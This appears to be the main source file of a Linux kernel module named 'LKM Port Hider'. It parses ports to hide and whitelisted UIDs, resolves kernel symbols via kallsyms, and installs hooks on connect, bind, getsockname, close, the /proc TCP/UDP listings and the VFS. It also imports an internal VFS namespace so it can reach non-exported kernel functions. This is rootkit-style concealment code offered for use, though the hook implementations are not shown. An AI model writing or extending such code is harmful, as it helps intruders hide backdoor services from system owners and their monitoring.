#include "port_hider.h"

static char *ports;
static char *whitelist_uids;
static int hooks;
int debug;

module_param(ports, charp, 0444);
module_param(whitelist_uids, charp, 0444);
module_param(hooks, int, 0444);
module_param(debug, int, 0444);

u16 hidden_ports[MAX_PORTS];
int nr_hidden_ports;
kuid_t allowed_uids[MAX_UIDS];
int nr_allowed_uids;

struct hlist_head fd_htable[FD_HASH_SIZE];
DEFINE_SPINLOCK(fd_lock);

struct blocked_entry blocked[MAX_BLOCKED_PATHS];
int nr_blocked;

static int __init port_hider_init(void)
{
    int n;

    if (setup_kallsyms()) return -ENOENT;

    n = parse_ports(ports);
    if (n < 1) { pr_err("no valid ports specified\n"); return -EINVAL; }

    n = parse_uids(whitelist_uids, allowed_uids, MAX_UIDS);
    if (n < 0) { pr_err("parse_uids failed (%d)\n", n); return n; }
    nr_allowed_uids = n;

    pr_info("hiding ports:");
    { int i; for (i = 0; i < nr_hidden_ports; i++)
        pr_cont(" %d", ntohs(hidden_ports[i])); }
    pr_cont("\n");

    if (hooks & HOOK_CONNECT) setup_connect();
    if (hooks & HOOK_BIND)    setup_bind();
    if (hooks & HOOK_GSN)     setup_gsn();
    if (hooks & HOOK_CLOSE)   setup_close();
    if (hooks & HOOK_PROC)    setup_tcp_proc();
    if (hooks & HOOK_UDP)     setup_udp_proc();
    if (hooks & HOOK_VFS)     setup_vfs();

    pr_info("loaded (v" PORT_HIDER_VER ")\n");
    return 0;
}

static void __exit port_hider_exit(void)
{
    if (hooks & HOOK_VFS)     cleanup_vfs();
    if (hooks & HOOK_UDP)     cleanup_udp_proc();
    if (hooks & HOOK_PROC)    cleanup_tcp_proc();
    if (hooks & HOOK_CLOSE)   cleanup_close();
    if (hooks & HOOK_GSN)     cleanup_gsn();
    if (hooks & HOOK_BIND)    cleanup_bind();
    if (hooks & HOOK_CONNECT) cleanup_connect();

    fdmap_cleanup();

    pr_info("unloaded\n");
}

module_init(port_hider_init);
module_exit(port_hider_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR(PORT_HIDER_AUTHOR);
MODULE_DESCRIPTION("LKM Port Hider - hide TCP/UDP ports from connect/bind/proc probes");
MODULE_VERSION(PORT_HIDER_VER);
MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
